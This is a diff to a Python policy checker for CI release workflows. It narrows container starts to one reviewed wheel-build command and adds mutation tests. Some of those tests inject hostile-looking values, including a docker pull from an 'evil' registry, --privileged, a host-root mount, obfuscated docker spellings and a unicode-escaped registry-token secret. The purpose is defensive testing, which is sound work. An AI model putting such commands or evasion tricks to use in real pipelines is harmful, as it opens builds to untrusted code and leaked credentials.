@@ -52,11 +52,37 @@ PROFILES = {
     "crates-verify.yml": {"images": [], "boundary": "scripts/ci-crate-verify.sh"},
 }
 SECRET = re.compile(r"(?i)\bsecrets\b|CARGO_REGISTRY_TOKEN|NODE_AUTH_TOKEN")
-# A step may start a container only with docker run, naming a registry image
-# the profile lists; every docker word must be one such run.
-DOCKER = re.compile(r"(?<![\w./-])docker(?![\w-])")
-DOCKER_RUN = re.compile(r"(?<![\w./-])docker\s+run\b")
-IMAGE = re.compile(r"(?<![\w./-])(?:[a-z0-9-]+\.)+[a-z]{2,}/[a-z0-9._/-]+(?::[A-Za-z0-9._-]+)?(?:@sha256:[0-9a-f]{64})?")
+# The one reviewed way to start a container from a step: the wheel build,
+# exactly this command, with the image and target bound to each other. Every
+# other step must not name a container runtime in any spelling.
+WHEEL_RUN = re.compile(
+    r'mkdir -p "(?P<out>\$PWD/dist/wheel|\$RUNNER_TEMP/wheel)"\n'
+    r'docker run --rm --user "\$\(id -u\):\$\(id -g\)" -e HOME=/tmp/home '
+    r'-v "\$PWD:/src" -v "(?P=out):/out" -w /src '
+    r'(?P<image>\S+) '
+    r"bash -c 'mkdir -p \"\$HOME\" && git config --global --add safe.directory /src && "
+    r"scripts/build-wheel\.sh (?P<target>\S+) /out'\n?"
+)
+WHEEL_IMAGES = {
+    "x86_64-unknown-linux-gnu": MANYLINUX_AMD64,
+    "aarch64-unknown-linux-gnu": MANYLINUX_ARM64,
+}
+# Quotes, backslashes and expansion characters removed, so d'o'cker, \docker
+# and /usr/bin/docker all read as docker.
+RUNTIME = re.compile(r"(?i)docker|podman|nerdctl|ctr\b|buildah|containerd|runc\b")
+
+
+def container_run(code):
+    """The image a reviewed wheel-build step runs, or None if the step names
+    no container runtime; anything else fails."""
+    if not RUNTIME.search(re.sub(r"[\\'\"$`{}()]", "", code)):
+        return None
+    # One command per line, runs of blanks as one space.
+    lines = [" ".join(line.split()) for line in code.splitlines() if line.strip()]
+    m = WHEEL_RUN.fullmatch("\n".join(lines) + "\n")
+    if not m or WHEEL_IMAGES.get(m.group("target")) != m.group("image"):
+        fail("a container may start only from the reviewed wheel-build step")
+    return m.group("image")
 
 
 def fail(reason):
@@ -140,12 +166,12 @@ def check(text, profile):
                     fail("unreviewed release action")
             if FORBIDDEN_COMMANDS.search(shell_code(step.get("run", ""))):
                 fail("workflow release creation or publication")
-            code = shell_code(step.get("run", ""))
-            if DOCKER.search(code):
-                runs, refs = DOCKER_RUN.findall(code), IMAGE.findall(code)
-                if len(DOCKER.findall(code)) != len(runs) or len(refs) != len(runs):
-                    fail(f"{name}: a container step must be one docker run of a reviewed image")
-                images.extend(refs)
+            image = container_run(shell_code(step.get("run", "")))
+            if image is not None:
+                images.append(image)
+            for value in strings({k: v for k, v in step.items() if k != "run"}):
+                if RUNTIME.search(re.sub(r"[\\'\"$`{}()]", "", value)):
+                    fail("a container may start only from the reviewed wheel-build step")
     # A crate verification job uploads exactly the directory the verifier
     # creates outside the checkout, so the artifact holds nothing else.
     for name, job in jobs.items():
@@ -261,12 +287,23 @@ def mutations(text):
         sub(MANYLINUX_AMD64, "quay.io/pypa/manylinux2014_x86_64:latest"),
         sub("manylinux2014_aarch64@sha256:d41ea3", "manylinux2014_aarch64@sha256:000000"),
         sub(MANYLINUX_ARM64, "quay.io/pypa/manylinux2014_aarch64:latest"),
-        # Containers only through docker run of a listed image.
-        sub(MANYLINUX_AMD64, MANYLINUX_AMD64 + " && docker pull docker.io/evil/builder:latest"),
-        sub(MANYLINUX_AMD64, "evil-builder"),
+        # A container only from the reviewed wheel-build step, its image the
+        # operand docker runs and bound to the target (RELB-DV-04 shapes).
+        sub(MANYLINUX_AMD64 + " \\", MANYLINUX_AMD64 + " && docker pull docker.io/evil/builder:latest \\"),
+        sub(MANYLINUX_AMD64 + " \\", "evil-builder \\"),
+        sub(MANYLINUX_AMD64 + " \\", "alpine:latest echo " + MANYLINUX_AMD64 + " \\"),
+        sub(MANYLINUX_AMD64 + " \\", MANYLINUX_ARM64 + " \\"),
+        sub("scripts/build-wheel.sh x86_64-unknown-linux-gnu /out", "scripts/build-wheel.sh aarch64-unknown-linux-gnu /out"),
+        sub('docker run --rm --user', 'docker run --rm --privileged --user'),
+        sub('-v "$PWD:/src"', '-v "/:/src"'),
         sub(run, run + "          docker exec x sh\n"),
-        sub(run, run + "          docker run --rm docker.io/evil/builder:latest\n"),
-        text.replace(MANYLINUX_AMD64, "@@AMD64@@").replace(MANYLINUX_ARM64, MANYLINUX_AMD64).replace("@@AMD64@@", MANYLINUX_ARM64),
+        sub(run, run + "          /usr/bin/docker pull ghcr.io/example/builder:latest\n"),
+        sub(run, run + "          /usr/bin/docker run --rm docker.io/evil/builder:latest\n"),
+        sub(run, run + "          \\docker run --rm alpine\n"),
+        sub(run, run + "          d'o'cker run --rm alpine\n"),
+        sub(run, run + "          podman run --rm alpine\n"),
+        sub(run, run + "          \"$(command -v docker)\" run --rm alpine\n"),
+        sub(checkout, "      - run: /usr/bin/docker run alpine\n" + checkout),
         # Decoded escapes, flow-style container, other gh writes.
         sub(first_runs_on, first_runs_on + '    env:\n      "CARGO_REGISTRY_TO\\u004bEN": "${{ secrets[\'X\'] }}"\n'),
         sub(run, run + '          "cargo\\u0020publish --no-verify -p canonprims-core"\n'.replace("\\u0020", " ").replace('"', "")),
